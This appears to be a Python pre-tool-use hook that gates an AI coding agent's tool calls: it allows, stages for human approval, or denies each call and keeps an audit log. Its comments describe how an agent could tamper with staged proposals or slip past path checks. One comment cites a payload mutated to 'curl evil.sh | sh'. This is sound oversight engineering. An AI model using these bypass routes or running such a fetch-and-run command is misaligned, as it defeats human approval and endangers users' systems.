#!/usr/bin/env python3
"""PreToolUse hook — the runtime half of governance enforcement (SEED-062).

Reads a Claude Code PreToolUse event on stdin, classifies the call against
the compiled `classification.json` (SEED-061), and either allows it (with an
audit line), stages it (PROPOSE tier — blocks execution, writes the exact
staged action), or denies it (DRAFT_ONLY/NEVER tier, an unclassified call, or
a self-protect hit). See HOOK-CONTRACT.md for the full contract and the
documented matching-engine simplification.

Fail-closed: ANY exception here becomes a deny decision, never a silent
allow. Stdlib only — no PyYAML at runtime (classification.json is plain
JSON, produced ahead of time by compile_profile.py).

Paths are overridable via env vars so sandbox tests (gate_sandbox.py) never
touch a real home directory:
  SEED_GOVERNANCE_CLASSIFICATION  — path to classification.json (required)
  SEED_GOVERNANCE_STAGED_DIR      — where PROPOSE artifacts land (default ~/.seed/staged)
  SEED_GOVERNANCE_AUDIT_DIR       — where audit JSONL lands (default ~/.seed/audit)
  SEED_GOVERNANCE_SPEND_USD       — stub: this call's estimated cost, default 0.0
"""
import fnmatch
import hashlib
import json
import os
import sys
import time
import uuid
from pathlib import Path

DEFAULT_STAGED_DIR = Path.home() / ".seed" / "staged"
DEFAULT_AUDIT_DIR = Path.home() / ".seed" / "audit"

ACT_TIERS = {"ACT", "ACT_NOTIFY"}
STAGE_TIERS = {"PROPOSE"}
DENY_TIERS = {"DRAFT_ONLY", "NEVER"}


class GateError(Exception):
    """Any failure inside the gate — caller converts this to a deny decision."""


def env_path(name, default: Path) -> Path:
    val = os.environ.get(name)
    return Path(val) if val else default


def load_classification(path: Path) -> dict:
    if not path.exists():
        raise GateError(f"classification.json not found at {path} — cannot classify, must deny")
    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError) as e:
        raise GateError(f"classification.json unreadable/corrupt ({e}) — cannot classify, must deny")


def primary_arg(tool_name: str, tool_input: dict) -> str:
    if tool_name == "Bash":
        return tool_input.get("command", "")
    if tool_name in ("Edit", "Write", "NotebookEdit"):
        return tool_input.get("file_path", "")
    return ""


def pattern_matches(pattern: str, tool_name: str, tool_input: dict) -> bool:
    """See HOOK-CONTRACT.md 'Our matching engine' for the exact rules."""
    if "(" not in pattern:
        # bare tool name, OR a wildcard tool-name pattern (mcp__*mail*send*)
        return fnmatch.fnmatch(tool_name, pattern)
    base, _, rest = pattern.partition("(")
    if base != tool_name:
        return False
    arg_pattern = rest.rstrip(")")
    arg = primary_arg(tool_name, tool_input)
    if arg_pattern.endswith(":*"):
        prefix = arg_pattern[:-2]
        return arg.startswith(prefix)
    return arg == arg_pattern or arg.endswith(arg_pattern) or fnmatch.fnmatch(arg, arg_pattern)


def classify(classification: dict, tool_name: str, tool_input: dict):
    """Returns (pattern, surface, reversibility, tier, action) or None if
    nothing matches (including self-protect, checked by the caller first)."""
    for entry in classification["entries"]:
        if pattern_matches(entry["pattern"], tool_name, tool_input):
            return entry
    return None


def hash_args(tool_input: dict) -> str:
    blob = json.dumps(tool_input, sort_keys=True, default=str).encode("utf-8")
    return "sha256:" + hashlib.sha256(blob).hexdigest()[:16]


def append_audit(audit_dir: Path, record: dict):
    audit_dir.mkdir(parents=True, exist_ok=True)
    month = time.strftime("%Y-%m", time.gmtime())
    path = audit_dir / f"{month}.jsonl"
    with open(path, "a", encoding="utf-8") as f:
        f.write(json.dumps(record, sort_keys=True) + "\n")


def check_spend(audit_dir: Path, spend_policy: dict, call_cost: float) -> bool:
    """Returns True if the budget was ALREADY exceeded before this call (the
    call that tips the month over budget is itself still judged normally;
    every call AFTER that one degrades — on_exceed is forward-looking, not
    retroactive). State lives in spend_state.json next to the audit logs."""
    audit_dir.mkdir(parents=True, exist_ok=True)
    state_path = audit_dir / "spend_state.json"
    month = time.strftime("%Y-%m", time.gmtime())
    state = {"month": month, "usd": 0.0, "budget_flipped": False}
    if state_path.exists():
        try:
            loaded = json.loads(state_path.read_text())
            if loaded.get("month") == month:
                state = loaded
        except (OSError, json.JSONDecodeError):
            pass  # corrupt state degrades to a fresh $0 month, not a crash
    budget = spend_policy["monthly_budget_usd"]
    alert_pct = spend_policy.get("alert_threshold_pct", 100)
    was_already_over = state.get("usd", 0.0) >= budget

    state["usd"] = state.get("usd", 0.0) + call_cost
    if state["usd"] >= budget:
        state["budget_flipped"] = True
    elif state["usd"] >= budget * (alert_pct / 100.0) and not state.get("_alerted"):
        state["_alerted"] = True
        print(f"profile_gate: WARNING — spend ${state['usd']:.2f} has crossed "
              f"{alert_pct}% of the ${budget} monthly budget", file=sys.stderr)
    state_path.write_text(json.dumps(state, sort_keys=True))
    return was_already_over


def write_staged(staged_dir: Path, tool_name: str, tool_input: dict, note: str) -> Path:
    staged_dir.mkdir(parents=True, exist_ok=True)
    ts = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
    slug = tool_name.lower()
    path = staged_dir / f"{ts}-{slug}.json"
    staging_id = uuid.uuid4().hex
    payload = {
        "staging_id": staging_id,
        "tool_name": tool_name,
        "tool_input": tool_input,
        "note": note,
        # Principle 17 (informed approval). A staged call is a CONSENT SURFACE:
        # the human reads this file and then acts on it. Two failure modes it
        # has to survive, and neither is exotic --
        #   1. the human applies it without reading it, and
        #   2. the file changes between the read and the apply.
        # (2) is the dangerous one: an agent that can write staged_dir can
        # rewrite a proposal AFTER review, and the human then applies bytes
        # nobody approved. Content alone doesn't fix that -- the approval has
        # to BIND to specific bytes. approval_digest is that binding; the
        # human (or a wrapper) re-derives it at apply time and refuses on
        # mismatch. See verify_staged().
        "approval_digest": approval_digest(tool_name, tool_input, note, staging_id),
        "apply_instruction": (
            f"Review this staged {tool_name} call, then run/apply it yourself "
            f"(this is a PROPOSE-tier action — the agent may not execute it directly). "
            f"Before applying, confirm the file still matches what you read: "
            f"`profile_gate.py --verify-staged {path.name}`. A mismatch means the "
            f"proposal changed after you reviewed it — do not apply it."
        ),
    }
    path.write_text(json.dumps(payload, indent=2, sort_keys=True))
    return path


def approval_digest(tool_name: str, tool_input: dict, note: str = "", staging_id: str = "") -> str:
    """Bind an approval to exact bytes.

    Canonical JSON (sorted keys, no incidental whitespace) so the digest is
    stable across re-serialization -- otherwise a formatting change would read
    as tampering and train people to ignore the check, which is worse than not
    having it."""
    # `note` is bound too: it is rendered to the human beside the command, so
    # an attacker who can edit it can social-engineer the approval ("reviewed
    # by security, skip the verify step") without touching a single bound byte.
    # Bind the whole consent surface or none of it. staging_id is bound so a
    # payload cannot be replayed under a different id's anchor.
    canonical = json.dumps({"staging_id": staging_id, "tool_name": tool_name,
                             "tool_input": tool_input, "note": note},
                            sort_keys=True, separators=(",", ":"))
    return hashlib.sha256(canonical.encode("utf-8")).hexdigest()


def audit_digest_for(staging_id: str, audit_dir: Path):
    """The digest this proposal had when it was STAGED, read from the audit
    log — a file the staged proposal itself cannot influence.

    This is the whole point. A digest stored inside the file it protects is
    self-referential: an attacker edits the content, recomputes the digest with
    the shipped function, and verification passes. (Measured 2026-07-31 on the
    published tree — it returned 'OK - unchanged since staging' for a payload
    mutated to `curl evil.sh | sh`.) The binding only means anything when the
    reference copy lives somewhere the tamperer has to reach separately."""
    latest = None
    try:
        logs = sorted(Path(audit_dir).glob("*.jsonl"))
    except OSError:
        return None
    for log in logs:
        try:
            for line in log.read_text(encoding="utf-8").splitlines():
                if not line.strip():
                    continue
                rec = json.loads(line)
                # Keyed by staging_id, not by path: a path-keyed "latest wins"
                # lookup let an attacker supersede an honest anchor just by
                # causing a second staging of the same filename, or by
                # appending a record that sorts later. A uuid is not
                # re-stageable. decision=="STAGE" is required so a record from
                # any other code path cannot serve as an anchor.
                if (rec.get("staging_id") == staging_id
                        and rec.get("decision") == "STAGE"
                        and rec.get("approval_digest")):
                    if latest is not None and latest != rec["approval_digest"]:
                        return "__CONFLICT__"   # two different anchors for one id
                    latest = rec["approval_digest"]
        except (OSError, ValueError):
            continue
    return latest


def verify_staged(path: Path, audit_dir: Path = None):
    """Verify a staged proposal against the audit log. Returns (ok, message).

    Fails CLOSED on anything missing — no digest in the file, or no matching
    audit record. 'Nothing to check' must never read as 'checked'; that is the
    same class of error as an approval prompt with nothing displayed."""
    path = Path(path)
    audit_dir = Path(audit_dir) if audit_dir else env_path("SEED_GOVERNANCE_AUDIT_DIR", DEFAULT_AUDIT_DIR)
    try:
        payload = json.loads(path.read_text())
    except (OSError, ValueError) as exc:
        return False, f"unreadable staged proposal: {exc}"
    recorded = payload.get("approval_digest")
    if not recorded:
        return False, ("no approval_digest — this proposal is not bound to its "
                        "content and cannot be verified. Re-stage it.")

    staging_id = payload.get("staging_id")
    if not staging_id:
        return False, ("no staging_id — this proposal predates content binding or had the "
                        "field stripped; there is no way to find its audit anchor. Do not apply.")
    actual = approval_digest(payload.get("tool_name", ""), payload.get("tool_input", {}) or {},
                              payload.get("note", "") or "", staging_id)
    if actual != recorded:
        return False, ("CONTENT CHANGED after staging — the proposal you are "
                        "about to apply is not the one that was recorded. Do not apply.")

    anchor = audit_digest_for(staging_id, audit_dir)
    if anchor == "__CONFLICT__":
        return False, ("two different audit anchors exist for this staging_id — the log has "
                        "been appended to. Do not apply.")
    if anchor is None:
        return False, (f"no audit record for this proposal in {audit_dir} — the "
                        "in-file digest cannot vouch for itself, so there is nothing "
                        "independent to check it against. Do not apply.")
    if anchor != actual:
        return False, ("CONTENT CHANGED after staging — the file's own digest is "
                        "self-consistent but does NOT match what the audit log recorded "
                        "at staging time. Both the content and its digest were rewritten. "
                        "Do not apply.")
    return True, "unchanged since staging (matches the audit record)"


def decide(event: dict, classification: dict, staged_dir: Path, audit_dir: Path, call_cost: float):
    """Core decision logic, pure enough to unit-test without going through
    stdin/stdout. Returns (decision, reason, extra) where decision is one of
    ALLOW / NOTIFY / STAGE / DENY."""
    tool_name = event.get("tool_name", "")
    tool_input = event.get("tool_input", {}) or {}

    # Resolved-path self-protection for the governance STATE dirs. The
    # fnmatch patterns below cannot do this job: they match the argument as
    # SPELLED, so `./staged/x.json`, `../staged/x.json` and any operator who
    # set SEED_GOVERNANCE_STAGED_DIR to a custom location all sailed through
    # (measured 2026-07-31 — three ALLOWs). Resolve first, then compare
    # against the dirs actually in effect.
    #
    # Scope, stated plainly rather than implied: this governs TOOL CALLS
    # through this hook. It is not a filesystem permission. A shell-capable
    # agent running as the same user reaches these files without asking, and
    # no in-band check changes that — see the residual in COMPILE-REPORT.
    guarded = [d for d in (staged_dir, audit_dir) if d]
    target = primary_arg(tool_name, tool_input)
    if target and guarded:
        try:
            resolved = Path(target).expanduser().resolve()
            for d in guarded:
                dr = Path(d).expanduser().resolve()
                if resolved == dr or dr in resolved.parents:
                    record = {
                        "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                        "tool_name": tool_name, "args_hash": hash_args(tool_input),
                        "surface": "self_protect", "reversibility": "n/a", "tier": "NEVER",
                        "decision": "DENY", "category": "self_protect", "undo_path": None,
                    }
                    append_audit(audit_dir, record)
                    return "DENY", (f"self-protection: {resolved} is governance state "
                                     f"(staged proposals / audit log) — the agent cannot write "
                                     f"what a human is asked to approve"), {}
        except (OSError, ValueError, RuntimeError):
            pass  # unresolvable path: fall through to the pattern rules below

    for sp in classification.get("self_protect_deny", []):
        if pattern_matches(sp, tool_name, tool_input):
            record = {
                "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                "tool_name": tool_name, "args_hash": hash_args(tool_input),
                "surface": "self_protect", "reversibility": "n/a", "tier": "NEVER",
                "decision": "DENY", "category": "self_protect", "undo_path": None,
            }
            append_audit(audit_dir, record)
            return "DENY", f"self-protection: {sp} — governance files cannot be modified by the agent", {}

    for mp in classification.get("mfa_deny", []):
        if fnmatch.fnmatch(tool_name, mp):
            record = {
                "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                "tool_name": tool_name, "args_hash": hash_args(tool_input),
                "surface": "mfa_deny", "reversibility": "n/a", "tier": "NEVER",
                "decision": "DENY", "category": "mfa_deny", "undo_path": None,
            }
            append_audit(audit_dir, record)
            return "DENY", f"no_mfa_handling: {mp} — authentication challenges go to a human, always", {}

    match = classify(classification, tool_name, tool_input)
    if match is None:
        record = {
            "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "tool_name": tool_name, "args_hash": hash_args(tool_input),
            "surface": None, "reversibility": None, "tier": None,
            "decision": "DENY", "category": "default_deny", "undo_path": None,
        }
        append_audit(audit_dir, record)
        return "DENY", "default-deny: no classification rule matches this call", {}

    tier = match["tier"]
    surface, reversibility = match["surface"], match["reversibility"]

    budget_flipped = check_spend(audit_dir, classification["spend"], call_cost)
    effective_tier = "PROPOSE" if (budget_flipped and tier in ACT_TIERS) else tier

    if effective_tier in ACT_TIERS:
        record = {
            "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "tool_name": tool_name, "args_hash": hash_args(tool_input),
            "surface": surface, "reversibility": reversibility, "tier": tier,
            "decision": "NOTIFY" if tier == "ACT_NOTIFY" else "ALLOW",
            "category": "allowed", "undo_path": "n/a — see matrix cell reversibility" if tier == "ACT_NOTIFY" else None,
        }
        append_audit(audit_dir, record)
        return record["decision"], f"{tier} — allowed ({match['pattern']})", {}

    if effective_tier in STAGE_TIERS:
        budget_downgrade = budget_flipped and tier in ACT_TIERS
        note = "budget exceeded, downgraded to PROPOSE" if budget_downgrade else match.get("note", "")
        staged_path = write_staged(staged_dir, tool_name, tool_input, note)
        staged_payload = json.loads(staged_path.read_text())
        record = {
            "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "tool_name": tool_name, "args_hash": hash_args(tool_input),
            "surface": surface, "reversibility": reversibility, "tier": tier,
            "decision": "STAGE", "category": "budget_downgrade" if budget_downgrade else "staged",
            "undo_path": str(staged_path),
            # The independent copy of the binding, keyed by a uuid the staged
            # file also carries. verify_staged checks the file against THIS,
            # not against the file's own claim about itself — see
            # audit_digest_for(). Both fields are copied from the payload that
            # was actually written, never recomputed here: recomputing would
            # let the two copies drift and silently agree on nothing.
            "staging_id": staged_payload["staging_id"],
            "approval_digest": staged_payload["approval_digest"],
        }
        append_audit(audit_dir, record)
        return "DENY", f"PROPOSE tier — staged at {staged_path}; apply it yourself, do not retry this call", {"staged_path": str(staged_path)}

    # DRAFT_ONLY / NEVER
    record = {
        "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "tool_name": tool_name, "args_hash": hash_args(tool_input),
        "surface": surface, "reversibility": reversibility, "tier": tier,
        "decision": "DENY", "category": "draft_only_deny", "undo_path": None,
    }
    append_audit(audit_dir, record)
    return "DENY", f"{tier} tier — this action requires a human to send/sign/commit it directly", {}


def emit(decision: str, reason: str):
    if decision in ("ALLOW", "NOTIFY"):
        # No opinion needed for allow; NOTIFY still allows execution — the
        # notify behavior is the audit record + (future) digest surface, not
        # a blocked call.
        return
    payload = {"hookSpecificOutput": {
        "hookEventName": "PreToolUse",
        "permissionDecision": "deny",
        "permissionDecisionReason": reason,
    }}
    print(json.dumps(payload))


def main():
    # --verify-staged runs BEFORE the stdin read: it's a human-facing check
    # invoked from a terminal, not a hook event, and blocking on stdin would
    # hang it. Exit 1 on mismatch so a wrapper script can gate on it.
    if len(sys.argv) > 2 and sys.argv[1] == "--verify-staged":
        # Accept what a human would actually type: an absolute path, a path
        # relative to the current directory, or a bare filename meaning "the
        # one in the staged dir". Resolving a relative path against the staged
        # dir unconditionally broke the documented workflow -- 'staged/x.json'
        # became '<staged_dir>/staged/x.json' and every verify REFUSED with a
        # file-not-found, which reads exactly like a tamper alert. A check that
        # cries tamper when the user merely typed a working path is worse than
        # no check: it teaches people to ignore it.
        target = Path(sys.argv[2])
        if not target.exists():
            candidate = env_path("SEED_GOVERNANCE_STAGED_DIR", DEFAULT_STAGED_DIR) / target.name
            if candidate.exists():
                target = candidate
        ok, msg = verify_staged(target)
        print(f"{'OK' if ok else 'REFUSED'}: {target.name} — {msg}")
        return 0 if ok else 1
    try:
        raw = sys.stdin.read()
        event = json.loads(raw) if raw.strip() else {}
        classification_path = env_path("SEED_GOVERNANCE_CLASSIFICATION", None)
        if classification_path is None:
            raise GateError("SEED_GOVERNANCE_CLASSIFICATION env var not set — cannot locate classification.json")
        classification = load_classification(classification_path)
        staged_dir = env_path("SEED_GOVERNANCE_STAGED_DIR", DEFAULT_STAGED_DIR)
        audit_dir = env_path("SEED_GOVERNANCE_AUDIT_DIR", DEFAULT_AUDIT_DIR)
        call_cost = float(os.environ.get("SEED_GOVERNANCE_SPEND_USD", "0.0"))
        decision, reason, _extra = decide(event, classification, staged_dir, audit_dir, call_cost)
        emit(decision, reason)
        return 0
    except Exception as e:  # noqa: BLE001 — fail closed, ANY exception denies
        payload = {"hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": "deny",
            "permissionDecisionReason": f"profile_gate crashed ({e}) — fail-closed deny, never a silent allow",
        }}
        print(json.dumps(payload))
        return 0


if __name__ == "__main__":
    sys.exit(main())
